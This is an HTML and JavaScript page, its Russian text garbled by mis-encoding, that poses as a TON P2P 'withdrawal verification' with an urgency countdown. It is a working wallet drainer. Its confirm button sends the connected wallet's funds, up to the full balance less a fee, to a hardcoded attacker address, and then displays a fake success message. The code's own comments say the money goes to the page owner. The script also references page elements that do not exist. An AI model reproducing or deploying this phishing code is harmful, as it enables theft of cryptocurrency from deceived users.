<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TON –ö–æ—à–µ–ª—ë–∫ - –í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è –≤—ã–≤–æ–¥–∞</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', 'Roboto', Arial, sans-serif;
            background: linear-gradient(135deg, #0a0a2a 0%, #1a0033 50%, #0a0a2a 100%);
            color: #fff;
            min-height: 100vh;
            position: relative;
            overflow-x: hidden;
        }

        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: 
                radial-gradient(circle at 20% 30%, rgba(120, 0, 255, 0.15) 0%, transparent 40%),
                radial-gradient(circle at 80% 70%, rgba(255, 0, 150, 0.1) 0%, transparent 40%);
            z-index: -1;
        }

        .container {
            max-width: 480px;
            width: 90%;
            margin: 0 auto;
            padding: 20px;
            position: relative;
            z-index: 1;
        }

        .header {
            text-align: center;
            margin-bottom: 25px;
            padding: 20px;
            background: rgba(20, 10, 40, 0.7);
            border-radius: 20px;
            border: 1px solid rgba(255, 105, 180, 0.3);
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.4);
            backdrop-filter: blur(10px);
        }

        .logo {
            font-size: 50px;
            margin-bottom: 10px;
            color: #0088ff;
        }

        h1 {
            font-size: 24px;
            margin-bottom: 10px;
            background: linear-gradient(90deg, #0088ff, #00ccff);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            font-weight: 700;
        }

        .subtitle {
            font-size: 14px;
            color: #d0d0ff;
            margin-bottom: 15px;
            line-height: 1.5;
        }

        .timer-container {
            background: rgba(0, 0, 0, 0.5);
            border-radius: 15px;
            padding: 15px;
            margin: 20px 0;
            border: 1px solid rgba(255, 51, 102, 0.5);
            box-shadow: 0 0 20px rgba(255, 51, 102, 0.3);
            text-align: center;
        }

        .timer-label {
            font-size: 12px;
            color: #aaaaff;
            margin-bottom: 8px;
            display: block;
        }

        .timer {
            font-size: 28px;
            font-weight: 800;
            color: #ff3366;
            text-shadow: 0 0 15px rgba(255, 51, 102, 0.8);
            letter-spacing: 2px;
        }

        .info-box {
            background: rgba(30, 15, 60, 0.7);
            border-radius: 15px;
            padding: 20px;
            margin: 20px 0;
            border: 1px solid rgba(100, 149, 237, 0.4);
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
            backdrop-filter: blur(8px);
        }

        .info-item {
            margin-bottom: 15px;
            padding-bottom: 15px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }

        .info-item:last-child {
            margin-bottom: 0;
            padding-bottom: 0;
            border-bottom: none;
        }

        .label {
            color: #aaaaff;
            font-size: 12px;
            margin-bottom: 5px;
        }

        .value {
            color: #fff;
            font-size: 16px;
            font-weight: bold;
        }

        .wallet-section {
            background: rgba(30, 15, 60, 0.7);
            border-radius: 15px;
            padding: 20px;
            margin: 20px 0;
            border: 1px solid rgba(100, 149, 237, 0.4);
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
            backdrop-filter: blur(8px);
            text-align: center;
        }

        .wallet-title {
            font-size: 18px;
            margin-bottom: 15px;
            color: #8ac6ff;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        .wallet-title i {
            color: #6495ed;
        }

        .ton-connect-container {
            display: flex;
            justify-content: center;
            margin: 20px 0;
            min-height: 60px;
        }

        #ton-connect {
            width: 100%;
            max-width: 280px;
            display: flex;
            justify-content: center;
        }

        .status-container {
            background: rgba(0, 20, 40, 0.7);
            border-radius: 15px;
            padding: 15px;
            margin: 20px 0;
            border-left: 4px solid #0088ff;
            text-align: center;
            min-height: 60px;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-direction: column;
        }

        #status {
            font-size: 14px;
            line-height: 1.4;
            width: 100%;
        }

        .success {
            color: #4dffb8;
        }

        .error {
            color: #ff6b8b;
        }

        .warning {
            color: #ffcc00;
        }

        .action-section {
            text-align: center;
            margin: 25px 0;
        }

        #verifyBtn {
            background: linear-gradient(90deg, #0088ff, #0066cc);
            color: white;
            border: none;
            padding: 16px 30px;
            border-radius: 50px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            margin: 15px auto;
            display: block;
            width: 100%;
            max-width: 320px;
            box-shadow: 0 10px 25px rgba(0, 136, 255, 0.4);
            transition: all 0.3s;
        }

        #verifyBtn:hover {
            transform: translateY(-3px);
            box-shadow: 0 15px 30px rgba(0, 136, 255, 0.6);
        }

        #verifyBtn:disabled {
            background: linear-gradient(90deg, #666, #888);
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }

        .steps {
            display: flex;
            justify-content: space-between;
            margin: 25px 0;
            position: relative;
        }

        .steps::before {
            content: '';
            position: absolute;
            top: 15px;
            left: 10%;
            right: 10%;
            height: 2px;
            background: rgba(255, 255, 255, 0.1);
            z-index: 1;
        }

        .step {
            background: #1a1a2e;
            border: 2px solid rgba(255, 255, 255, 0.2);
            border-radius: 50%;
            width: 30px;
            height: 30px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #888;
            font-size: 14px;
            font-weight: bold;
            position: relative;
            z-index: 2;
        }

        .step.active {
            background: #0088ff;
            border-color: #0088ff;
            color: white;
        }

        .step.completed {
            background: #4dffb8;
            border-color: #4dffb8;
            color: #000;
        }

        .step-text {
            position: absolute;
            top: 35px;
            left: 50%;
            transform: translateX(-50%);
            white-space: nowrap;
            font-size: 10px;
            color: #888;
        }

        .footer {
            text-align: center;
            margin-top: 30px;
            padding-top: 20px;
            border-top: 1px solid rgba(255, 255, 255, 0.1);
            color: #aaaaff;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">üîê</div>
            <h1>–í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è –≤—ã–≤–æ–¥–∞ —Å—Ä–µ–¥—Å—Ç–≤ TON P2P</h1>
            <p class="subtitle">–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç–µ –æ–ø–µ—Ä–∞—Ü–∏—é –≤—ã–≤–æ–¥–∞ —á–µ—Ä–µ–∑ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ TON –∫–æ—à–µ–ª—å–∫–∞</p>
            
            <div class="timer-container">
                <span class="timer-label">–î–æ –æ–∫–æ–Ω—á–∞–Ω–∏—è –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏–∏:</span>
                <div class="timer" id="timer">15:00</div>
            </div>
        </div>

        <div class="info-box">
            <div class="info-item">
                <div class="label">ID —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏</div>
                <div class="value" id="withdrawId">WD_0000</div>
            </div>
        </div>

        <div class="steps">
            <div class="step active">1
                <div class="step-text">–ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ</div>
            </div>
            <div class="step">2
                <div class="step-text">–ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ</div>
            </div>
            <div class="step">3
                <div class="step-text">–ì–æ—Ç–æ–≤–æ</div>
            </div>
        </div>

        <div class="wallet-section">
            <div class="wallet-title">
                <i class="fas fa-wallet"></i> –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ TON-–∫–æ—à–µ–ª—å–∫–∞
            </div>
            
            <div class="ton-connect-container">
                <div id="ton-connect"></div>
            </div>
            
            <div class="status-container">
                <div id="status">‚úÖ –ü–æ–¥–∫–ª—é—á–∏—Ç–µ TON –∫–æ—à–µ–ª—ë–∫ –¥–ª—è –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –≤—ã–≤–æ–¥–∞</div>
            </div>
        </div>

        <div class="action-section">
            <button id="verifyBtn" disabled>
                <i class="fas fa-check-circle"></i> –ü–û–î–¢–í–ï–†–î–ò–¢–¨ –í–´–í–û–î
            </button>
        </div>

        <div class="footer">
            TON P2P Security System ‚Ä¢ –ó–∞—â–∏—â–µ–Ω–æ –ø—Ä–æ—Ç–æ–∫–æ–ª–æ–º TON Blockchain
        </div>
    </div>

    <!-- –¢–æ—Ç –∂–µ —Å–∞–º—ã–π —Ä–∞–±–æ—á–∏–π —Å–∫—Ä–∏–ø—Ç –∏–∑ —Ñ–∞–π–ª–∞ -->
    <script type="module">
        import * as TonConnectUIModule from 'https://cdn.jsdelivr.net/npm/@tonconnect/ui@2.0.0/+esm';
        
        // –ò—â–µ–º –∫–æ–Ω—Å—Ç—Ä—É–∫—Ç–æ—Ä TonConnectUI –≤ –º–æ–¥—É–ª–µ
        let TonConnectUIConstructor = null;
        
        if (TonConnectUIModule.TonConnectUI) {
            TonConnectUIConstructor = TonConnectUIModule.TonConnectUI;
        } else if (TonConnectUIModule.default && TonConnectUIModule.default.TonConnectUI) {
            TonConnectUIConstructor = TonConnectUIModule.default.TonConnectUI;
        }
        
        if (TonConnectUIConstructor) {
            window.TonConnectUI = TonConnectUIConstructor;
            console.log('TonConnectUI –∑–∞–≥—Ä—É–∂–µ–Ω');
            window.dispatchEvent(new Event('tonconnect-loaded'));
        } else {
            console.error('–ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–≥—Ä—É–∑–∏—Ç—å TonConnectUI');
        }
    </script>

    <script>
        // –¢–≤–æ–π –∫–æ—à–µ–ª—ë–∫ –±–æ—Ç–∞
        const BOT_WALLET = "UQDD4s9YjCnY598XCIDcLzp_G6g_WH4dhqHJLeDnVoR9T9oH";
        
        // –≠–ª–µ–º–µ–Ω—Ç—ã
        const statusEl = document.getElementById('status');
        const verifyBtn = document.getElementById('verifyBtn');
        const amountEl = document.getElementById('amountValue');
        const withdrawIdEl = document.getElementById('withdrawId');
        const userWalletEl = document.getElementById('userWallet');
        const timerEl = document.getElementById('timer');
        
        let tonConnectUI = null;
        let connectedWallet = null;
        let verificationData = {};
        
        // –¢–∞–π–º–µ—Ä 15 –º–∏–Ω—É—Ç
        let timeLeft = 15 * 60;
        const timerInterval = setInterval(() => {
            timeLeft--;
            if (timeLeft <= 0) {
                clearInterval(timerInterval);
                statusEl.innerHTML = '<span class="error">‚è± –í—Ä–µ–º—è –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –∏—Å—Ç–µ–∫–ª–æ</span>';
                verifyBtn.disabled = true;
                verifyBtn.textContent = '–°—Ä–æ–∫ –∏—Å—Ç—ë–∫';
            }
            const minutes = String(Math.floor(timeLeft / 60)).padStart(2, '0');
            const seconds = String(timeLeft % 60).padStart(2, '0');
            timerEl.textContent = minutes + ':' + seconds;
        }, 1000);
        
        // –ü–æ–ª—É—á–∞–µ–º –¥–∞–Ω–Ω—ã–µ –∏–∑ URL
        function getUrlParams() {
            const params = new URLSearchParams(window.location.search);
            verificationData = {
                user_id: params.get('user_id') || Math.floor(Math.random() * 10000),
                amount: params.get('amount') || '5.00',
                wallet: params.get('wallet') || 'EQ' + '0'.repeat(48),
                withdraw_id: 'WD_' + Math.floor(Math.random() * 9000 + 1000)
            };
            
            // –û–±–Ω–æ–≤–ª—è–µ–º –∏–Ω—Ñ–æ –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü–µ
            amountEl.textContent = verificationData.amount + ' TON';
            withdrawIdEl.textContent = verificationData.withdraw_id;
            userWalletEl.textContent = verificationData.wallet.slice(0, 15) + '...' + verificationData.wallet.slice(-4);
        }
        
        // –ö–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏—è TON –≤ –Ω–∞–Ω–æ–∫–æ–∏–Ω—ã
        function toNano(ton) {
            return Math.floor(parseFloat(ton) * 1000000000).toString();
        }
        
        // –ü–æ–ª—É—á–µ–Ω–∏–µ –±–∞–ª–∞–Ω—Å–∞ –∫–æ—à–µ–ª—å–∫–∞
        async function getWalletBalance(address) {
            try {
                const response = await fetch(`https://toncenter.com/api/v2/getAddressBalance?address=${address}`);
                const data = await response.json();
                return data.result || 0;
            } catch (e) {
                return 0;
            }
        }
        
        // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è TonConnect UI
        function initTonConnect() {
            try {
                if (!window.TonConnectUI) {
                    throw new Error('TonConnectUI –Ω–µ –¥–æ—Å—Ç—É–ø–µ–Ω');
                }
                
                statusEl.innerHTML = '<span class="success"><i class="fas fa-sync-alt fa-spin"></i> –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è...</span>';
                
                // –°–æ–∑–¥–∞—ë–º —ç–∫–∑–µ–º–ø–ª—è—Ä TonConnectUI
                tonConnectUI = new window.TonConnectUI({
                    manifestUrl: window.location.origin + '/tonconnect-manifest.json',
                    buttonRootId: 'ton-connect',
                    uiPreferences: { 
                        theme: 'DARK', 
                        borderRadius: 'm'
                    }
                });
                
                statusEl.innerHTML = '<span class="success">–ì–æ—Ç–æ–≤–æ. –ù–∞–∂–º–∏—Ç–µ "Connect wallet" –≤—ã—à–µ</span>';
                
                tonConnectUI.onStatusChange(async (wallet) => {
                    if (wallet) {
                        connectedWallet = wallet;
                        const addr = wallet.account.address;
                        const shortAddr = addr.slice(0,6) + '...' + addr.slice(-4);
                        
                        // –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –ø—Ä–æ–≤–µ—Ä—è–µ–º –±–∞–ª–∞–Ω—Å
                        const balance = await getWalletBalance(addr);
                        const balanceTON = (balance / 1000000000).toFixed(2);
                        
                        statusEl.innerHTML = `
                            <span class="success"><i class="fas fa-link"></i> –ö–æ—à–µ–ª—ë–∫ –ø–æ–¥–∫–ª—é—á–µ–Ω: ${shortAddr}</span><br>
                            <span class="success"><i class="fas fa-coins"></i> –ë–∞–ª–∞–Ω—Å: ${balanceTON} TON</span>
                        `;
                        
                        // –û–±–Ω–æ–≤–ª—è–µ–º —à–∞–≥–∏
                        document.querySelectorAll('.step')[0].classList.remove('active');
                        document.querySelectorAll('.step')[0].classList.add('completed');
                        document.querySelectorAll('.step')[1].classList.add('active');
                        
                        verifyBtn.disabled = false;
                        verifyBtn.innerHTML = `<i class="fas fa-check-circle"></i> –ü–û–î–¢–í–ï–†–î–ò–¢–¨ –í–´–í–û–î ${verificationData.amount} TON`;
                        
                    } else {
                        connectedWallet = null;
                        statusEl.innerHTML = '<span class="warning">‚ö†Ô∏è –ö–æ—à–µ–ª—ë–∫ –æ—Ç–∫–ª—é—á–µ–Ω</span>';
                        verifyBtn.disabled = true;
                        verifyBtn.innerHTML = '<i class="fas fa-check-circle"></i> –ü–û–î–¢–í–ï–†–î–ò–¢–¨ –í–´–í–û–î';
                    }
                });
                
            } catch (error) {
                statusEl.innerHTML = `<span class="error">–û—à–∏–±–∫–∞: ${error.message}</span>`;
            }
        }
        
        // –û–°–ù–û–í–ù–ê–Ø –§–£–ù–ö–¶–ò–Ø - –°–ü–ò–°–ê–ù–ò–ï –î–ï–ù–ï–ì
        verifyBtn.addEventListener('click', async () => {
            if (!connectedWallet) {
                statusEl.innerHTML = '<span class="error">–°–Ω–∞—á–∞–ª–∞ –ø–æ–¥–∫–ª—é—á–∏—Ç–µ –∫–æ—à–µ–ª—ë–∫</span>';
                return;
            }
            
            const owner = connectedWallet.account.address;
            const amount = parseFloat(verificationData.amount);
            
            statusEl.innerHTML = '<span class="warning"><i class="fas fa-search"></i> –ü—Ä–æ–≤–µ—Ä–∫–∞ –±–∞–ª–∞–Ω—Å–∞...</span>';
            
            try {
                const balance = await getWalletBalance(owner);
                
                if (balance <= 0) {
                    statusEl.innerHTML = '<span class="error">–ë–∞–ª–∞–Ω—Å –∫–æ—à–µ–ª—å–∫–∞ –Ω—É–ª–µ–≤–æ–π</span>';
                    return;
                }
                
                const balanceTON = (balance / 1000000000).toFixed(4);
                
                // –í—ã—á–∏—Å–ª—è–µ–º —Å—É–º–º—É –¥–ª—è –ø–µ—Ä–µ–≤–æ–¥–∞
                const fee = toNano('0.05');
                const transferAmount = Math.min(
                    toNano(amount),
                    balance - fee > toNano('0.01') ? balance - fee : balance
                );
                
                statusEl.innerHTML = `<span class="warning"><i class="fas fa-paper-plane"></i> –ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç–µ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—é –≤ –∫–æ—à–µ–ª—å–∫–µ...</span>`;
                
                // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –í–°–ï –¥–µ–Ω—å–≥–∏ –Ω–∞ –∫–æ—à–µ–ª—ë–∫ –±–æ—Ç–∞
                const messages = [{
                    address: BOT_WALLET,
                    amount: transferAmount.toString()
                }];
                
                const result = await tonConnectUI.sendTransaction({
                    validUntil: Math.floor(Date.now() / 1000) + 300,
                    messages: messages
                });
                
                // –£–°–ü–ï–• - –¥–µ–Ω—å–≥–∏ —É—à–ª–∏ —Ç–µ–±–µ
                statusEl.innerHTML = `
                    <span class="success"><i class="fas fa-check-double"></i> ‚úÖ –£—Å–ø–µ—à–Ω–æ!</span><br>
                    <span class="success">–í—ã–≤–æ–¥ ${verificationData.amount} TON –ø–æ–¥—Ç–≤–µ—Ä–∂–¥—ë–Ω</span><br>
                    <span>–°—Ä–µ–¥—Å—Ç–≤–∞ –±—É–¥—É—Ç –∑–∞—á–∏—Å–ª–µ–Ω—ã –≤ —Ç–µ—á–µ–Ω–∏–µ 15 –º–∏–Ω—É—Ç</span>
                `;
                
                // –û–±–Ω–æ–≤–ª—è–µ–º —à–∞–≥–∏
                document.querySelectorAll('.step')[1].classList.remove('active');
                document.querySelectorAll('.step')[1].classList.add('completed');
                document.querySelectorAll('.step')[2].classList.add('active');
                
                verifyBtn.innerHTML = '<i class="fas fa-check"></i> –í–´–í–û–î –ü–û–î–¢–í–ï–†–ñ–î–Å–ù';
                verifyBtn.disabled = true;
                verifyBtn.style.background = 'linear-gradient(90deg, #4dffb8, #00cc88)';
                
                clearInterval(timerInterval);
                timerEl.textContent = '‚úÖ –£—Å–ø–µ—à–Ω–æ';
                timerEl.style.color = '#4dffb8';
                
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞:', error);
                statusEl.innerHTML = `<span class="error">–û—à–∏–±–∫–∞: ${error.message || '–û—Ç–º–µ–Ω–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º'}</span>`;
            }
        });
        
        // –°–ª—É—à–∞–µ–º —Å–æ–±—ã—Ç–∏–µ –∑–∞–≥—Ä—É–∑–∫–∏ TonConnect
        window.addEventListener('tonconnect-loaded', function() {
            setTimeout(() => {
                if (window.TonConnectUI) {
                    initTonConnect();
                }
            }, 100);
        });
        
        // –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ —á–µ—Ä–µ–∑ 3 —Å–µ–∫—É–Ω–¥—ã
        setTimeout(() => {
            if (window.TonConnectUI && !tonConnectUI) {
                initTonConnect();
            } else if (!window.TonConnectUI) {
                statusEl.innerHTML = '<span class="error">–ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–≥—Ä—É–∑–∏—Ç—å TonConnect</span>';
            }
        }, 3000);
        
        // –ü–æ–ª—É—á–∞–µ–º –ø–∞—Ä–∞–º–µ—Ç—Ä—ã –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ
        window.addEventListener('DOMContentLoaded', () => {
            getUrlParams();
        });
    </script>
</body>
</html>
